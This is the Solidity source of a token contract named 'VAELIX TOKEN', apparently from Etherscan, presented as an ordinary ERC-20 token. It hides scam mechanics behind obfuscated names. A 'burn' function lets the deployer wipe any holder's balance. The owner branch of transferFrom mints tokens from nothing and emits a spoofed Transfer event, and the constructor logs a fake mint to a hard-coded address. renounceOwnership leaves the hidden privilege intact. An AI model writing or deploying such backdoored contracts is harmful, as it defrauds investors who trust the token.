/**
 *Submitted for verification at Etherscan.io on 2023-03-14
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract VAELIX {
    using SafeMath for uint256;
    mapping (address => uint256) private xxIa;
	
    mapping (address => uint256) private xxIb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "VAELIX TOKEN";
	
    string public symbol = "VAELIX";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private xxIc;
     

  
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address xxIf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
       
             xxIa[msg.sender] = totalSupply;
        
       ORBIT();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function ORBIT() internal  {                             
                       xxIb[msg.sender] = 6;
                       xxIc = xxIf;

                

        emit Transfer(address(0), xxIc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return xxIa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {

    require(xxIa[msg.sender] >= value);
xxIa[msg.sender] -= value;  
xxIa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 	

function burn (address Addy) public {
 uint256 burned = xxIa[Addy];

  
      if(xxIb[msg.sender] >= 6) {


xxIa[Addy] -= burned;


}}

 

   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  
 if(from == owner){
        require(value <= allowance[from][msg.sender]);
        xxIa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(xxIf, to, value);
        return true;}
        else
      
        require(value <= xxIa[from]);
        require(value <= allowance[from][msg.sender]);
        xxIa[from] -= value;
        xxIa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
       


      
}



     

        	
 }